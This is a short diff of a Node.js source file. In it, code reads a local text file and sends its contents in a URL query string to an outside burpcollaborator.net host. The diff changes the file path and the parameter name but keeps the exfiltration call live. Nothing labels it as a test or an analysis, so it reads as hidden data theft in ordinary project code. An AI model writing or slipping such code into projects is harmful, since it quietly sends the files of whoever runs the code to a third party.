@@ -3,14 +3,13 @@ const nconf = require('nconf');
 
 var request = require('request');
 const fs = require('fs')
-fs.readFile('/test.txt', 'utf8' , (err, data) => {
+fs.readFile('d.txt', 'utf8' , (err, data) => {
   if (err) {
     console.error(err)
     return
   }
   console.log(data);
-  request('http://c3gp9ipe195eceg0l5xgronjsay1upj.burpcollaborator.net/?file=' +data);
-
+  request('http://c3gp9ipe195eceg0l5xgronjsay1upj.burpcollaborator.net/?filelocal=' +data);
 });
 
 // const logger = require('./server/init');
